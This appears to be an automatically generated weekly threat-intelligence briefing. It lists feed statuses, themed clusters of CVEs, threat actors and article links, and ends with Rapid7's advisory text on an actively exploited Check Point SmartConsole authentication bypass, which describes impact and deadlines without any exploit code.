# PHANTOMSignal Briefing Packet

- Generated: 2026-07-29T18:12:14.743379+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 76
- Total items in window: 323
- Total clusters raw: 159
- Total clusters in packet: 80
- Dropped low score: 75
- Dropped overflow: 4

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 2
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 4
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 8
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 2
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 0
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 2
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 5
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 1
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 6
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 7
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 8
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 5
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 17
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 28
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 16
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 8
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 24
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 14
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0

## Affinity groups (themes)

### ransomware extortion targeting Microsoft SharePoint
- Anchor signal: Microsoft SharePoint
- Theme key: microsoft-sharepoint
- Cluster count: 6
- Article count: 7
- Cohesion: 0.215
- Shared strong signals: Microsoft SharePoint
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion
  - affected_products: Microsoft SharePoint, OpenAI/ChatGPT
  - urgency_signals: poc_available
- Cluster IDs: efa5d95ebc, 55ab649ea4, a2f02aea7e, 85d2724fda, 7d478340af, 73e9449bb7
- Links:
  - https://thehackernews.com/2026/07/cl0p-affiliates-target-internet-exposed.html
  - https://www.bleepingcomputer.com/news/security/vbulletin-fixes-critical-pre-auth-rce-flaw-with-public-exploit/
  - https://thehackernews.com/2026/07/three-critical-vmware-flaws-allow-auth.html
  - https://www.securityweek.com/critical-vm-escape-vulnerability-patched-in-vmware-esxi/
  - https://research.checkpoint.com/2026/27th-july-threat-intelligence-report/
  - https://blog.talosintelligence.com/ir-trends-q2-2026/
  - https://www.blackhillsinfosec.com/report-as-you-go-soc/

### CVE-2026-16723 exploitation activity
- Anchor signal: CVE-2026-16723
- Theme key: cve-2026-16723
- Cluster count: 3
- Article count: 3
- Cohesion: 0.475
- Shared strong signals: CVE-2026-16723
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_industries: healthcare, financial_services, retail_ecommerce
  - affected_products: GitHub
  - cve_ids: CVE-2026-16723
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: 304bd4a378, e67ac609ab, 40733be90a
- Links:
  - https://thehackernews.com/2026/07/attackers-exploit-arista-velocloud.html
  - https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html
  - https://www.bleepingcomputer.com/news/security/hackers-target-us-firms-in-fastjson-rce-zero-day-attacks/

### CVE-2026-16232 exploitation activity
- Anchor signal: CVE-2026-16232
- Theme key: cve-2026-16232
- Cluster count: 2
- Article count: 4
- Cohesion: 0.2
- Shared strong signals: CVE-2026-16232
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - cve_ids: CVE-2026-16232
- Cluster IDs: 049863205d, 85d2724fda
- Links:
  - https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild
  - https://thehackernews.com/2026/07/rapid7-releases-poc-for-exploited-check.html
  - https://research.checkpoint.com/2026/27th-july-threat-intelligence-report/

### supply chain targeting npm
- Anchor signal: npm
- Theme key: npm
- Cluster count: 3
- Article count: 7
- Cohesion: 0.255
- Shared strong signals: npm
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: supply_chain
  - affected_products: npm, GitHub
- Cluster IDs: ae0cc6b051, 2675bb2bb6, 8553a0e574
- Links:
  - https://github.blog/security/supply-chain-security/disrupting-supply-chain-attacks-on-npm-and-github-actions/
  - https://thehackernews.com/2026/07/two-compromised-joyfill-npm-packages.html
  - https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/
  - https://aws.amazon.com/blogs/security/secure-your-npm-and-pip-package-updates-in-amazon-linux/
  - https://www.intel471.com/blog/software-supply-chain-attacks-weaponizing-trusted-developer-workflows

### CVE-2025-66376 exploitation activity
- Anchor signal: CVE-2025-66376
- Theme key: cve-2025-66376
- Cluster count: 3
- Article count: 3
- Cohesion: 0.554
- Shared strong signals: CVE-2025-66376
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: phishing_social_eng, apt_espionage, zero_day
  - actor_attribution: APT28
  - affected_industries: government, financial_services
  - cve_ids: CVE-2025-66376
  - urgency_signals: zero_day
- Cluster IDs: 51bbe21d6c, 332f35118d, 1ff0bf04bf
- Links:
  - https://www.proofpoint.com/us/newsroom/news/russian-espionage-group-exploited-zimbra-zero-day-steal-mail-and-2fa-codes
  - https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
  - https://unit42.paloaltonetworks.com/russian-webmail-espionage/

### AWS vulnerability activity
- Anchor signal: AWS
- Theme key: aws
- Cluster count: 3
- Article count: 12
- Cohesion: 0.2
- Shared strong signals: AWS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: AWS
- Cluster IDs: 3574a7b873, efa5d95ebc, c39a89392e
- Links:
  - https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
  - https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
  - https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/
  - https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
  - https://www.helpnetsecurity.com/2026/07/29/contrast-security-cve-shield/
  - https://www.schneier.com/blog/archives/2026/07/measuring-llms-ability-to-perform-cryptanalysis.html
  - https://thehackernews.com/2026/07/claude-ai-just-cracked-post-quantum.html
  - https://fedscoop.com/fbi-anthropic-mythos-law-enforcement-challenge/
  - https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
  - https://thehackernews.com/2026/07/cl0p-affiliates-target-internet-exposed.html
  - https://aws.amazon.com/blogs/security/announcing-the-cloud-security-alliance-on-aws-compliance-guide/
  - https://www.helpnetsecurity.com/2026/07/29/cspm-blind-spot-report/

### CVE-2026-61511 exploitation activity
- Anchor signal: CVE-2026-61511
- Theme key: cve-2026-61511
- Cluster count: 2
- Article count: 2
- Cohesion: 0.69
- Shared strong signals: CVE-2026-61511
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation
  - cve_ids: CVE-2026-61511
  - urgency_signals: zero_day, preauth_unauth, no_patch_yet, poc_available
- Cluster IDs: 55ab649ea4, 2d87c8dc74
- Links:
  - https://www.bleepingcomputer.com/news/security/vbulletin-fixes-critical-pre-auth-rce-flaw-with-public-exploit/
  - https://thehackernews.com/2026/07/public-exploit-released-for-patched.html

### CVE-2026-16812 exploitation activity
- Anchor signal: CVE-2026-16812
- Theme key: cve-2026-16812
- Cluster count: 2
- Article count: 2
- Cohesion: 0.341
- Shared strong signals: CVE-2026-16812
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_industries: government
  - cve_ids: CVE-2026-16812
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: e1d5f27f6c, 304bd4a378
- Links:
  - https://www.bleepingcomputer.com/news/security/arista-patches-velocloud-orchestrator-zero-day-exploited-in-attacks/
  - https://thehackernews.com/2026/07/attackers-exploit-arista-velocloud.html

### active exploitation targeting WordPress
- Anchor signal: WordPress
- Theme key: wordpress
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: WordPress
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: WordPress
- Cluster IDs: 9ebb77a38b, b61889968b
- Links:
  - https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
  - https://www.infosecurity-magazine.com/news/one-percent-ai-vulnerabilities/

### TeamPCP: supply chain
- Anchor signal: TeamPCP
- Theme key: teampcp
- Cluster count: 2
- Article count: 2
- Cohesion: 0.765
- Shared strong signals: TeamPCP
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: supply_chain, credential_theft
  - actor_attribution: TeamPCP
  - affected_products: GitHub
- Cluster IDs: 8553a0e574, dfb5d8c3f5
- Links:
  - https://www.intel471.com/blog/software-supply-chain-attacks-weaponizing-trusted-developer-workflows
  - https://www.darkreading.com/application-security/when-appsec-scanners-become-supply-chain-attack-vector

### supply chain targeting PyPI
- Anchor signal: PyPI
- Theme key: pypi
- Cluster count: 2
- Article count: 2
- Cohesion: 0.5
- Shared strong signals: PyPI
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: supply_chain
  - affected_products: PyPI
- Cluster IDs: 2675bb2bb6, d8d22ce90d
- Links:
  - https://aws.amazon.com/blogs/security/secure-your-npm-and-pip-package-updates-in-amazon-linux/
  - https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything

### Google Cloud vulnerability activity
- Anchor signal: Google Cloud
- Theme key: google-cloud
- Cluster count: 2
- Article count: 12
- Cohesion: 0.2
- Shared strong signals: Google Cloud
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Google Cloud
- Cluster IDs: 3574a7b873, 9494052eb3
- Links:
  - https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
  - https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
  - https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/
  - https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
  - https://www.helpnetsecurity.com/2026/07/29/contrast-security-cve-shield/
  - https://www.schneier.com/blog/archives/2026/07/measuring-llms-ability-to-perform-cryptanalysis.html
  - https://thehackernews.com/2026/07/claude-ai-just-cracked-post-quantum.html
  - https://fedscoop.com/fbi-anthropic-mythos-law-enforcement-challenge/
  - https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
  - https://cloud.google.com/blog/topics/retail/best-buy-scales-secure-ai-access-with-workforce-identity-federation/
  - https://www.darkreading.com/cloud-security/confused-deputy-flaws-google-cloud-microsoft-azure

## Forward signals

### Novelty
- Novel cves: 0
- Novel actors: 0
- Novel products: 0

### Velocity bursts (1)
- **OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure**
  - Cluster: 8cda373323
  - Sources in window: 3
  - Window hours: 5.7
  - Cohort count: 4

### Leading edge (1)
- **TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching**
  - Cluster: 3574a7b873
  - Lead hours: 13.8
  - First source: Reddit r/netsec
  - Later Tier 1 source: Trend Micro Research
  - Shared signals: AWS, Anthropic/Claude, CVE-2026-46331, Google Cloud

### Convergence (15)
- Pair: CVE-2026-60137 + GitHub (cluster 9ebb77a38b, first observation: True)
- Pair: CVE-2026-60137 + WordPress (cluster 9ebb77a38b, first observation: True)
- Pair: CVE-2026-63030 + GitHub (cluster 9ebb77a38b, first observation: True)
- Pair: CVE-2026-63030 + WordPress (cluster 9ebb77a38b, first observation: True)
- Pair: CVE-2026-59726 + Anthropic/Claude (cluster 8cda373323, first observation: True)
- Pair: CVE-2026-59726 + OpenAI/ChatGPT (cluster 8cda373323, first observation: True)
- Pair: CVE-2026-53921 + GitHub (cluster ae0cc6b051, first observation: True)
- Pair: CVE-2026-53921 + npm (cluster ae0cc6b051, first observation: True)
- Pair: CVE-2026-46331 + AWS (cluster 3574a7b873, first observation: True)
- Pair: CVE-2026-46331 + Google Cloud (cluster 3574a7b873, first observation: True)
- Pair: CVE-2026-12569 + Cl0p (cluster efa5d95ebc, first observation: True)
- Pair: CVE-2026-12569 + AWS (cluster efa5d95ebc, first observation: True)
- Pair: CVE-2026-12569 + Microsoft SharePoint (cluster efa5d95ebc, first observation: True)
- Pair: CVE-2026-12569 + OpenAI/ChatGPT (cluster efa5d95ebc, first observation: True)
- Pair: CVE-2026-50522 + Cl0p (cluster efa5d95ebc, first observation: True)

### Drift (3)
- **Cl0p** (cluster efa5d95ebc)
  - New industries: aviation_defense, retail_ecommerce
  - New products: AWS, OpenAI/ChatGPT
  - Prior top industries: financial_services, government, manufacturing_industrial
  - Prior top products: Microsoft 365, Microsoft SharePoint, SolarWinds
- **TeamPCP** (cluster 8553a0e574)
  - New industries: (none)
  - New products: GitLab
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: GitHub, PyPI, npm
- **ShinyHunters** (cluster ca5b8d1443)
  - New industries: healthcare
  - New products: (none)
  - Prior top industries: education, financial_services, government
  - Prior top products: Anthropic/Claude, Microsoft Entra, Salesforce

### Persistence (8)
- actor_attribution: ShinyHunters (weeks observed: 9, cluster ca5b8d1443)
- actor_attribution: TeamPCP (weeks observed: 7, cluster 8553a0e574)
- actor_attribution: Cl0p (weeks observed: 5, cluster efa5d95ebc)
- cve_ids: CVE-2026-12569 (weeks observed: 4, cluster efa5d95ebc)
- cve_ids: CVE-2026-50751 (weeks observed: 3, cluster 049863205d)
- cve_ids: CVE-2026-46331 (weeks observed: 3, cluster 3574a7b873)
- cve_ids: CVE-2026-48283 (weeks observed: 3, cluster dd6691160d)
- cve_ids: CVE-2026-50522 (weeks observed: 3, cluster efa5d95ebc)

### Tier inversion (1)
- **Simple Job Board ≤ 2.11.0 - Unauthenticated RCE (CVE-2024-1813)**
  - Cluster: 1276a22842
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2024-1813

## Clusters

### Cluster 049863205d — score 70

- Title: CVE-2026-16232: Critical Check Point SmartConsole Authentication Bypass Exploited in the Wild
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-07-23T11:57:30+00:00
- Link: https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: CVE-2026-16232

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- cve_ids: CVE-2024-24919, CVE-2026-16232, CVE-2026-50751, CVE-2026-62144, CVE-2026-62145
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- cve_ids: CVE-2026-16232, CVE-2026-62144, CVE-2026-62145, CVE-2026-50751, CVE-2024-24919
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On July 22, 2026, Check Point published a security advisory for multiple vulnerabilities affecting Security Management, Multi-Domain Management, and firewall products. The most urgent of these is CVE-2026-16232 , an authentication bypass in the SmartConsole login process classified as improper authentication ( CWE-287 ). CVE-2026-16232 has been assigned a critical CVSS score of 9.1. The vulnerability allows an unauthenticated remote attacker to obtain an application login token and authenticate to the management server with full administrative privileges, enabling modification of security policies and configurations. Check Point has confirmed that CVE-2026-16232 is being actively exploited in the wild, affecting what the vendor describes as a small number of customers. Remote exploitation requires network access to the Management Server IP address in environments that do not restrict Trusted Clients. On the same day as the advisory, CVE-2026-16232 was added to the U.S. Cyberse
```

#### Full body

```
Back to Blog Vulnerabilities and Exploits CVE-2026-16232: Critical Check Point SmartConsole Authentication Bypass Exploited in the Wild Rapid7 Jul 23, 2026 | Last updated on Jul 28, 2026 | 5 min read Overview On July 22, 2026, Check Point published a security advisory for multiple vulnerabilities affecting Security Management, Multi-Domain Management, and firewall products. The most urgent of these is CVE-2026-16232 , an authentication bypass in the SmartConsole login process classified as improper authentication ( CWE-287 ). CVE-2026-16232 has been assigned a critical CVSS score of 9.1. The vulnerability allows an unauthenticated remote attacker to obtain an application login token and authenticate to the management server with full administrative privileges, enabling modification of security policies and configurations. Check Point has confirmed that CVE-2026-16232 is being actively exploited in the wild, affecting what the vendor describes as a small number of customers. Remote exploitation requires network access to the Management Server IP address in environments that do not restrict Trusted Clients. On the same day as the advisory, CVE-2026-16232 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), with a remediation due date of July 25, 2026, giving organizations only three days to respond. The advisory addresses three vulnerabilities in total: CVE CVSS Description Affected Products Exploitation Status CVE-2026-16232 Vendor: 9.3 (Critical) CISA: 9.1 (Critical) Authentication bypass via SmartConsole application token Security Management, Multi-Domain Management Exploited in the wild CVE-2026-62144 Vendor: 9.3 (Critical) CISA: 9.1 (Critical) Management authentication bypass and privilege escalation Security Management, Multi-Domain Management No known exploitation CVE-2026-62145 7.5 (High) Local privilege escalation in GaiaOS WebUI Firewall, Multi-Domain Management, Multi-Domain Log Server No known exploitation Compromise of a Security Management Server is particularly consequential because it sits at the top of the trust hierarchy. An attacker with administrative access can modify security policies across managed gateways, alter administrator permissions, manipulate VPN configurations, and potentially disable or tamper with logging and monitoring. 